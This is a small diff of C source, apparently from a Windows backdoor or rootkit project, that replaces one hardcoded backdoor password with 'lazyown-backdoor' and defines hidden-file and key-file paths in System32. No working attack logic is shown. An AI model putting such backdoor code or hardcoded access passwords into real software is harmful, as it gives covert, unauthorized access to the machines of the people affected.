@@ -20,7 +20,9 @@
 #define PID_FILE "C:\\Windows\\System32\\pid.txt"
 #define HIDE_FILE "C:\\Windows\\System32\\hide.txt"
 #define KEY_FILE "C:\\Windows\\System32\\key.txt"
-#define PASSWORD "grisiscomebacksayknokknok"
+#ifndef PASSWORD
+#define PASSWORD "lazyown-backdoor"
+#endif
 
 typedef struct {
     char *command;
